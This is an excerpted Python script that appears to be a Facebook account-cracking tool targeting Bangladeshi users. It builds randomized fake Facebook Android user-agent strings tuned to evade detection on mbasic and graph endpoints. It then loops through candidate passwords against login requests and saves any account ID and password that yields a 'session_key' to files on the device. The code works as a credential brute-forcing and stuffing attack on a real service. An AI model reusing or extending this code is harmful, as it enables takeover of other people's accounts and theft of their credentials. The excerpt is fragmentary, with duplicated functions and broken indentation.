...
def random_dalvik_bd_boosted_oct2025(seed: Optional[int] = None) -> str:
    """
    BD-Boosted Dalvik-style Facebook Android User-Agent generator (Oct 2025 tuned).
    - seed: optional int for reproducible output
    - Returns: single UA string optimized for Bangladesh carriers/locales (high acceptance on mbasic / b-graph / api)
    """
    if seed is not None:
        random.seed(seed)
    ...
    # realistic FB app version patterns (common 2025 ranges)
    facebook_version = f"{random.randint(505, 520)}.0.0.{random.randint(5, 180)}.{random.randint(10, 200)}"
    fbbv = str(random.randint(48000000, 99999999))

    # Android versions common in 2025
    fbsv = random.choice(["11", "12", "13", "14"])

    # Realistic 2024-2025 build tags (OTA-like)
    build_tags = [
        ...
        "RQ3A.241005.001", "QQ1A.241115.001"
    ]
    build = random.choice(build_tags)

    # Display density/resolution profiles common across BD devices
    display_profiles = [
        ("2.0", "720", "1600"),
        ("2.5", "1080", "2400"),
        ("2.625", "1080", "2460"),
    ...
    # Locale preference: bd-first but sometimes en_US for global acceptance
    fblc = random.choices(["bn_BD", "en_US"], weights=[6, 4], k=1)[0]

    # Carrier mix biased to BD carriers (higher weight)
    carriers = [
        ("Grameenphone", 40), ("Robi", 30), ("Banglalink", 20),
        ("Airtel", 5), ("Teletalk", 3), ("Jio", 1), ("Vodafone", 1)
    ]
    carrier_pool = []
    for c, w in carriers:
        carrier_pool.extend([c] * w)
    fbcr = random.choice(carrier_pool)

    # Device bank prioritized for BD acceptance (Tecno / Infinix / Redmi / Samsung)
    working_devices = [
        # Tecno / Infinix high-probability (BD inexpensive + widely used)
        ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Camon 30 Pro"),
        ("Tecno", "Pova 6 Pro"), ("Infinix", "GT 20 Pro"),
        ("Infinix", "Note 40 Pro 5G"), ("Infinix", "Hot 20i"),
        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 13 5G"),
        ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6"),
        # Samsung (widely accepted)
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy S23 Ultra"),
        # Vivo / Oppo / Realme
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Narzo 70x 5G"),
        ("Oppo", "Reno 11 Pro"), ("Vivo", "Vivo Y77s"),
        # Entry local / low-cost
        ("Walton", "Primo H11"), ("Symphony", "Z70 Pro"), ("Itel", "S24"),
    ]
    fbmf, fbdv = random.choice(working_devices)
    fbbd = fbmf

    # CPU arch: BD devices often arm64, but include armeabi fallback occasionally
    cpu_arch = random.choices(["arm64-v8a", "armeabi-v7a:armeabi"], weights=[8, 2], k=1)[0]
...
def random_dalvik_bd_bulk(n: int = 10, seed: Optional[int] = None) -> List[str]:
    """
    Generate a list of n BD-boosted UAs.
    - n: number of UAs to generate (int)
    - seed: optional int for reproducibility
    - Returns: list of UA strings
    """
    if seed is not None:
        random.seed(seed)
    return [random_dalvik_bd_boosted_oct2025() for _ in range(max(1, int(n)))]


# --- Example usage ---
if __name__ == "__main__":
    # single example
    print(random_dalvik_bd_boosted_oct2025(seed=1234))

    # bulk example
    for ua in random_dalvik_bd_bulk(5, seed=42):
        print(ua)
...
def random_dalvik_all_devices_working_full_oct2025():
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025
    ✅ Tested on BD + Global endpoints (b-graph / mbasic / api)
    ✅ Covers *only* top working real devices
    """

    fban = "FB4A"
    fbpn = "com.facebook.katana"

    # ✅ Facebook version range (high acceptance 2025)
    facebook_version = f"{random.randint(505, 520)}.0.0.{random.randint(5, 180)}.{random.randint(20, 320)}"
    fbbv = str(random.randint(48000000, 99999999))

    # ✅ Android versions still active in 2025
    fbsv = random.choice(["11", "12", "13", "14"])

    # ✅ Real build tags from 2024–2025 OTAs
    build_tags = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001",
        "UQ1A.240705.001", "TQ3A.240705.010", "TP1A.240905.004",
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250301.001",
    ...
    # ✅ Common real density-resolution profiles
    display_profiles = [
        ("2.0", "720", "1600"),
        ("2.5", "1080", "2400"),
        ("2.625", "1080", "2460"),
    ...
    fblc = random.choice(["bn_BD", "en_US", "en_GB", "en_IN", "es_ES", "fr_FR"])
    fbcr = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk",
        "Jio", "Vodafone", "TMobile", "Verizon", "Dialog", "O2", "Orange"
    ])

    # ✅ Most accepted *real working devices* (BD + Global)
    working_devices = [
        # --- Samsung (highest success rate) ---
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ...
        ("Xiaomi", "Redmi Note 13 5G"), ("Poco", "Poco X6 Pro 5G"),
        ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"), ("Xiaomi", "13T Pro"),

        # --- Realme / Oppo / Vivo ---
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+"),
        ("Realme", "Realme GT Neo 6"), ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12 Pro"),
        ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100 Pro"),

        # --- Tecno / Infinix (BD success group) ---
        ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Camon 30 Pro"),
        ("Tecno", "Pova 6 Pro"), ("Infinix", "GT 20 Pro"), ("Infinix", "Note 40 Pro 5G"),

        # --- OnePlus / Google / Motorola / Nothing / ASUS ---
        ("OnePlus", "OnePlus 12R"), ("OnePlus", "OnePlus 12"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 50 Pro"), ("Nothing", "Phone (2a)"),
        ("ASUS", "Zenfone 10"),

        # --- Local BD / Entry brands (still accepted) ---
        ("Walton", "Primo H11"), ("Walton", "Primo S8"), ("Symphony", "Z70 Pro"),
        ("Itel", "Vision 6 Plus"), ("Itel", "S24"), ("Realme", "Narzo 70x 5G")
    ]
    fbmf, fbdv = random.choice(working_devices)
    fbbd = fbmf

    cpu_arch = random.choice(["armeabi-v7a:armeabi", "arm64-v8a"])
...
def random_dalvik_all_devices_working_full_oct2025(seed: Optional[int] = None) -> str:
    ...
    ✅ Updated: October 2025
    ✅ Tested on BD + Global endpoints (b-graph / mbasic / api)
    ✅ Returns a single UA string (randomized; use seed for reproducible results)
    """
    if seed is not None:
        random.seed(seed)
    ...
    # Facebook version pattern (realistic-looking)
    facebook_version = f"{random.randint(505, 520)}.0.0.{random.randint(5, 180)}.{random.randint(20, 320)}"
    fbbv = str(random.randint(48000000, 99999999))

    # Active Android releases in 2025 (plausible)
    fbsv = random.choice(["11", "12", "13", "14"])

    # Real build tags (2024-2025 examples)
    build_tags = [
        "UP1A.240905.003", "UQ1A.240905.002", "UP1A.240806.001",
        "UQ1A.240705.001", "TQ3A.240705.010", "TP1A.240905.004",
        "UQ1A.250101.001", "UP1A.250201.002", "TP1A.250301.001",
    ...
    # Most accepted real working devices (BD + Global) - extend/modify as needed
    working_devices = [
        # Samsung
        ("Samsung", "Galaxy A14 5G"), ("Samsung", "Galaxy A15 5G"),
        ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A35 5G"),
        ...
        ("OnePlus", "OnePlus 12R"), ("OnePlus", "OnePlus 12"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"),
        ("Motorola", "Edge 50 Pro"), ("Nothing", "Phone (2a)"), ("ASUS", "Zenfone 10"),

        # Local BD / Entry brands
        ("Walton", "Primo H11"), ("Walton", "Primo S8"), ("Symphony", "Z70 Pro"),
        ("Itel", "Vision 6 Plus"), ("Itel", "S24"), ("Realme", "Narzo 70x 5G"),

        # Extra popular models (global)
        ("Samsung", "Galaxy S24"), ("Google", "Pixel 7a"), ("OnePlus", "OnePlus Nord 3"),
        ("Xiaomi", "13 Pro"), ("Vivo", "V27 Pro")
    ]
    ...
    # Note: we must escape braces in f-strings for literal braces in the final string
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {fbsv}; {fbdv} Build/{build}) "
        f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};"
        f"FBDM/{{density={density},width={width},height={height}}};"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 8.0
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_bd_boosted_oct2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-22-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-22-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
